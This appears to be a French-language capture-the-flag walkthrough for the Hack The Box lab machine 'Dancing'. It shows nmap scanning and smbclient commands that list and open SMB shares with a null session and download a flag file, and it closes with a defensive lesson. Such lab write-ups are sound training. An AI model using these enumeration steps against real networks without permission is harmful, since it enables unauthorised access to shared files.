[⬅ Retour à Starting Point](../README.md) · [🏠 Accueil du repo](../../../README.md)

# Machine 3 — DANCING

**Partages SMB non protégés — Port 445**

## Concept

Découvrir et exploiter une session SMB nulle (sans identifiants) pour
accéder à des partages réseau.

## Méthodologie — commandes complètes

> nmap -sV -sC 10.129.x.x
>
> \# → 445/tcp microsoft-ds
>
> smbclient -L //10.129.x.x/ -N
>
> \# -N : session nulle (sans mot de passe)
>
> \# → liste des partages, ex: WorkShares
>
> smbclient //10.129.x.x/WorkShares -N
>
> ls
>
> get flag.txt
>
> exit
>
> cat flag.txt

## Points clés

- Une session SMB nulle donne accès aux partages mal configurés, sans
  identifiants.

- Toujours énumérer tous les partages disponibles avant de conclure à un
  accès refusé.

## Leçon retenue

*Restreindre l'accès anonyme aux partages SMB et exiger systématiquement
une authentification.*

---

[⬅ Précédent : Fawn](02-fawn.md) · [⬆ Index Starting Point](../README.md) · [Suivant : Redeemer ➡](04-redeemer.md)
